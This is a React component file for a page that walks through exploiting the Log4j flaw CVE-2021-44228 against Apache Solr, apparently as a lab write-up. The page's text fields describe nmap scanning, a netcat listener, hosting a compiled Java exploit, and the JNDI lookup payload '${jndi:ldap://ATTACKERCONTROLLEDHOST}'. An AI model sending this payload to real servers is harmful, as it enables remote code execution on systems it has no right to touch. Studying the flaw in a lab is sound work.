import logo from "./logo.svg";
import image from "./images/image.jpg";
import image2 from "./images/image2.jpg";
import image3 from "./images/image3.jpg";
import image4 from "./images/image4.jpg";
import image5 from "./images/image6.jpg";

import image6 from "./images/image6.jpg";
import image7 from "./images/image7.jpg";


import {
  Container,
  Header,
  Divider,
  Grid,
  Image,
  Segment,
} from "semantic-ui-react";
import WalkThrough from "./components/WalkThrough";

function App() {
  return (
    <div className="App">
      <WalkThrough
        projectHeader="CVE-2021-44228"
        projectExplainer="Log4J"
        problemContent="The application present on this target specifically uses ports that may not be immediately noticed by nmap. For the whole picture perspective, scan all ports like so: Scan all ports on machine via nmap"
        problemContent1="This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable log4j package. For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181. You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so:"
        problemContent2="${jndi:ldap://ATTACKERCONTROLLEDHOST} This syntax indicates that the log4j will invoke functionality from JNDI, or the 'Java Naming and Directory Interface.' Ultimately, this can be used to access external resources, or  references, which is what is weaponized in this attack The next question is, where could we enter this syntax?"
        problemContent3=" At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request... so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP handler."
        solutionContent1="Netcat Listener; Significant amount of information being shared in this Reddit thread: "
        img1={image}
        img2={image2}
        solutionContent2="Verifying NC connection;"
        img3={image3}
        solutionContent3="Serving the file to my IP address;"
        img4={image4}
        solutionContent4="Trigger the exploit and fire off our JNDI syntax "
        solutionContent5="Foothold Compiling java code Setting up http server and seeing confirmation that the exploit was uploaded"

        img6={image6}

        solutionContent7="  Setting up python 3 server Host the exploit Java file via HTTP"
        img7={image7}

      />
    </div>
  );
}

export default App;
